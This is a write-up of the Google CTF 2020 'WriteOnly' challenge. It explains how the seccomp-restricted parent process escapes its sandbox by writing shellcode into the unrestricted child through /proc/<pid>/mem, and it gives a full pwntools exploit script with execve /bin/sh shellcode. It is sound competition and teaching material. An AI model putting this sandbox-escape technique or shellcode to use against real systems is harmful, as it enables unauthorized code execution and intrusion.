---
layout: post
title: "Writeup for WriteOnly Google CTF - 2020"
date: 2020-08-24
excerpt: "Sandbox with shellcode exec"
tags: [Sandbox,Shellcode,CTF]
---

We had a really great time this weekend playing this year's edition of Google CTF. Although we were able to solve only 2 of the pwn challenges , here's the intended writeup for the challenge *WriteOnly*.

## tl;dr

To begin with , we're just given a binary and it's source code. Skimming through the source code , we find the binary being hardened with seccomp bpf filter.

Here's the list of all the allowed syscalls.

```c
void setup_seccomp() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_KILL);
  int ret = 0;
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(stat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lstat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(writev), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(access), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sched_yield), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(dup), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(dup2), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(clone), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fork), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(vfork), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(kill), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(gettimeofday), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getuid), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getgid), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
  ret |= seccomp_load(ctx);
  if (ret) {
    exit(1);
  }
}

```

A surprise that the challenge has for us is that `Read` syscall is **not allowed**.

## Idea of exploit

Again, going through source code , we see a few things happening.

+ A child is created which opens and reads 4 bytes of flag constantly.
+ The parent sets up seccomp, asks for a length and takes our shellcode as input and gives us code execution right away.

```c
int main(int argc, char *argv[]) {
  pid_t pid = check(fork(), "fork");
  if (!pid) {
    while (1) {
      check_flag();
    }
    return 0;
  }

  printf("[DEBUG] child pid: %d\n", pid);
  void_fn sc = read_shellcode();
  setup_seccomp();
  sc();

  return 0;
}

```

An important thing to notice here is , seccomp is enabled in the parent **after** the child has been created. Hence , the child **does not** inherit seccomp, so how cool is that?

The only thing that we could think of was to somehow **write** to the child's memory and get code execution in child too. But the question was , what do we write to child and how do we do it?

### Delving into the exploit

As suggested by [Sherl0ck](https://twitter.com/sherl0ck__), we could open a pseudo file called **/proc/\<pid of child>/mem** and write to any segment of memory of the child , just like editing a binary in plain ghex :P. And what more , the program already prints the PID of child coupled with **PIE** being disabled , hence confirming our approach to exploitation.
    So now , another question that should pop in our minds now is , where do we write in the memory of child to get code execution? We can blithely overwrite the **return address** of child with our shellcode. There's another problem , remember that child will die if parent dies , so we have to make sure that the parent is alive throughout our journey of popping shell through child.

#### Overwriting return address of child

tl;dr of the plan is :

+ Open **/proc/\<pid of child>/mem** with read-write permissions.
+ using **lseek** syscall to seek to the return address of child.
+ Write shellcode to return address and finally loop parent so that it doesn't die out.

```python
from pwn import *
import sys

HOST = 'writeonly.2020.ctfcompetition.com'
PORT = 1337
context.arch = 'amd64'
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./chal')

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

if __name__=="__main__":
    #shellcode for execve /bin/sh

    shell = asm("""
                mov r9,0x0068732f6e69622f
                push r9
                push rsp
                pop rdi
                xor rsi,rsi
                xor rdx,rdx
                mov rax,0x3b
                syscall
                """)
    reu('child pid: ')
    pid = int(rel().strip(),10)
    log.info('pid -> ' + str(pid))

    #Adjusting /proc/pid/mem to 8 bytes and storing on stack
    sc = asm('''
    mov r9, 0x006d656d2f2f322f
    push r9
    mov r9, 0x2f2f636f72702f2f
    push r9
    push rsp
    pop rdi
    push rax
    mov r10,rax
    mov rsi,2
    mov rdx,0
    mov rax,2
    syscall                       #Open file with read-write permissions
    mov rdi,rax
    mov r8,rdi
    mov rax, 8
    mov rsi,0x00000000004022e3    #lseek requires the address we want to seek to as offset
    mov rdx,1
    syscall
    mov rax,1
    mov rdi,r8
    mov rsi,r10
    add rsi,0x100                 #Fetching shellcode's address into rsi and writing to file
    mov rdx,0x30
    syscall
    loop: jmp loop                #Make sure parent does not die
            '''.format("0x" + (str(pid) + '//')[::-1].encode('hex')))
    sc = sc.ljust(0x100,'\x00')
    sc += shell  
    log.info('sc len : ' + str(len(sc)))
    sla('length? ',str(len(sc) + 1))
    gdb.attach(io)
    sla('shellcode. ',sc)
    io.interactive()
```

## Conclusion

The challenge taught me yet another way of escaping seccomp sandbox through writing to child's memory. kudos to Google CTF for such a good challenge. 


